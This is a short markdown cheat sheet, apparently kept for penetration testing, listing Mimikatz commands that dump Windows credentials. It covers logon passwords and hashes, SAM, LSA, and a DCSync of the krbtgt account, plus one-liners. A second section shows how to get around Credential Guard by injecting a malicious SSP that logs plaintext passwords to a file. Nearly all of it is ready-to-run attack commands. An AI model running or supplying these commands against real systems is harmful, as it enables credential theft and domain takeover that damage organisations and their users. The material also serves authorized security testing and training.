# Mimikatz

```powershell
privilege::debug

token::elevate

sekurlsa::logonpasswords #hashes and plaintext passwords
lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch #both these dump SAM

#OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

```

## Credential Guard  misc::memssp
- With Credential Guard enabled, hashes are now in VTL1, not in memory
- Mimikats can register a new SSP with the SSPI, and hopefully force the SSPI to use our SSP for authentiction, forcing it to call the SSP with plaintext creds, which we can intercept
- once injected, wait for a connection, or force a connection
```powershell
privilege::debug
misc::memssp
# saved in a log file, C:\Windows\System32\mimilsa.log
```
